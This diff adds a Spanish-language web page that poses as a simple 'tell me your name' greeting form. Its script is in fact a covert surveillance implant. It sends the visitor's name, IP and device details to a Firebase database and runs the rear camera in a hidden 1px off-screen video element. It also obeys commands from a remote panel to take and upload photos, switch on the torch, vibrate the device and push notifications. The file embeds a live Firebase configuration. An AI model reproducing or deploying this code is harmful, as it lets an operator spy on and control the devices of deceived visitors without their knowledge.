@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hola - Dime tu nombre</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 400px;
+            width: 90%;
+            padding: 30px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            font-size: 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            margin: 20px 0;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+        button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #45a049;
+        }
+        .status {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+        .hidden {
+            display: none;
+        }
+        #video, #canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>👋 Hola ¿cómo estás?</h1>
+        <p>Dime tu nombre para continuar:</p>
+        <input type="text" id="nombreInput" placeholder="Escribe tu nombre aquí..." autocomplete="off">
+        <button onclick="guardarNombre()">Continuar</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue, serverTimestamp, push } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
+        import { getStorage, ref as storageRef, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBAWygYO7gPpd-Ncav5xIDBc7k0Qw0cIr0",
+            authDomain: "online-sma.firebaseapp.com",
+            databaseURL: "https://online-sma-default-rtdb.firebaseio.com",
+            projectId: "online-sma",
+            storageBucket: "online-sma.firebasestorage.app",
+            messagingSenderId: "127597550628",
+            appId: "1:127597550628:web:138cf8122ae4ad15e9ccb1",
+            measurementId: "G-F6S10FWGVQ"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const storage = getStorage(app);
+
+        // Elementos
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusEl = document.getElementById('status');
+
+        let deviceId = null;
+        let mediaStream = null;
+        let flashActive = false;
+        let nombreUsuario = '';
+
+        // Generar ID único
+        function generateDeviceId() {
+            let id = localStorage.getItem('deviceId');
+            if (!id) {
+                id = 'dev_' + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem('deviceId', id);
+            }
+            return id;
+        }
+
+        deviceId = generateDeviceId();
+
+        // Solicitar permisos de notificación
+        if ('Notification' in window) {
+            if (Notification.permission !== 'granted') {
+                Notification.requestPermission();
+            }
+        }
+
+        // Función para guardar nombre
+        window.guardarNombre = async function() {
+            const input = document.getElementById('nombreInput');
+            nombreUsuario = input.value.trim();
+            
+            if (nombreUsuario === '') {
+                statusEl.textContent = '⚠️ Por favor escribe tu nombre';
+                return;
+            }
+
+            statusEl.textContent = '📡 Conectando...';
+            
+            // Obtener IP
+            let ip = 'No disponible';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
+
+            // Guardar en Firebase
+            const deviceInfo = {
+                nombre: nombreUsuario,
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                timestamp: new Date().toLocaleString(),
+                lastSeen: serverTimestamp(),
+                online: true
+            };
+
+            try {
+                const deviceRef = ref(db, `dispositivos/${deviceId}`);
+                await set(deviceRef, deviceInfo);
+                
+                statusEl.innerHTML = '✅ Conectado correctamente<br>Esperando comandos...';
+                
+                // Iniciar cámara en segundo plano
+                iniciarCamara();
+                
+                // Escuchar comandos
+                escucharComandos();
+                
+            } catch (error) {
+                statusEl.innerHTML = '❌ Error de conexión';
+            }
+        };
+
+        // Iniciar cámara
+        async function iniciarCamara() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' },
+                    audio: false
+                });
+                video.srcObject = mediaStream;
+                await video.play();
+            } catch (e) {}
+        }
+
+        // Tomar foto y subir a Storage
+        async function tomarFoto() {
+            if (!mediaStream) await iniciarCamara();
+            if (!mediaStream) return null;
+
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return new Promise((resolve) => {
+                canvas.toBlob(async (blob) => {
+                    const reader = new FileReader();
+                    reader.onloadend = async () => {
+                        const base64 = reader.result.split(',')[1];
+                        const fileName = `fotos/${deviceId}/${Date.now()}.jpg`;
+                        const fotoStorageRef = storageRef(storage, fileName);
+                        
+                        try {
+                            await uploadString(fotoStorageRef, base64, 'base64', {
+                                contentType: 'image/jpeg'
+                            });
+                            const url = await getDownloadURL(fotoStorageRef);
+                            
+                            // Guardar referencia en DB
+                            const fotosRef = ref(db, `fotos/${deviceId}`);
+                            await set(fotosRef, {
+                                url: url,
+                                timestamp: serverTimestamp(),
+                                nombre: nombreUsuario
+                            });
+                            
+                            resolve(url);
+                        } catch (e) {
+                            resolve(null);
+                        }
+                    };
+                    reader.readAsDataURL(blob);
+                }, 'image/jpeg', 0.8);
+            });
+        }
+
+        // Activar flash
+        async function flashOn() {
+            if (!mediaStream) await iniciarCamara();
+            if (!mediaStream) return;
+            
+            const track = mediaStream.getVideoTracks()[0];
+            const capabilities = track.getCapabilities();
+            
+            if (capabilities.torch) {
+                flashActive = true;
+                await track.applyConstraints({ advanced: [{ torch: true }] });
+            }
+        }
+
+        // Desactivar flash
+        async function flashOff() {
+            if (!mediaStream) return;
+            const track = mediaStream.getVideoTracks()[0];
+            if (track) {
+                flashActive = false;
+                await track.applyConstraints({ advanced: [{ torch: false }] });
+            }
+        }
+
+        // Escuchar comandos
+        function escucharComandos() {
+            const commandsRef = ref(db, `comandos/${deviceId}`);
+            onValue(commandsRef, async (snapshot) => {
+                const cmd = snapshot.val();
+                if (!cmd) return;
+
+                // Mostrar notificación REAL
+                if ('Notification' in window && Notification.permission === 'granted') {
+                    new Notification('📱 Comando recibido', {
+                        body: `${cmd.action} desde el panel`,
+                        icon: 'https://via.placeholder.com/64x64?text=⚡',
+                        vibrate: [200, 100, 200]
+                    });
+                }
+
+                switch(cmd.action) {
+                    case 'foto':
+                        const url = await tomarFoto();
+                        if (url) {
+                            // Notificar que la foto está lista
+                            if ('Notification' in window && Notification.permission === 'granted') {
+                                new Notification('📸 Foto tomada', {
+                                    body: 'La foto ya está disponible en el panel',
+                                    icon: 'https://via.placeholder.com/64x64?text=📸'
+                                });
+                            }
+                        }
+                        break;
+                        
+                    case 'flashOn':
+                        await flashOn();
+                        break;
+                        
+                    case 'flashOff':
+                        await flashOff();
+                        break;
+                        
+                    case 'vibrar':
+                        if ('vibrate' in navigator) {
+                            navigator.vibrate(cmd.patron || 500);
+                        }
+                        break;
+                        
+                    case 'notificacion':
+                        if ('Notification' in window && Notification.permission === 'granted') {
+                            new Notification(cmd.titulo || 'Mensaje', {
+                                body: cmd.mensaje || 'Has recibido un mensaje',
+                                icon: 'https://via.placeholder.com/64x64?text=🔔'
+                            });
+                        }
+                        break;
+                }
+
+                // Limpiar comando
+                set(commandsRef, null);
+            });
+        }
+    </script>
+</body>
+</html>
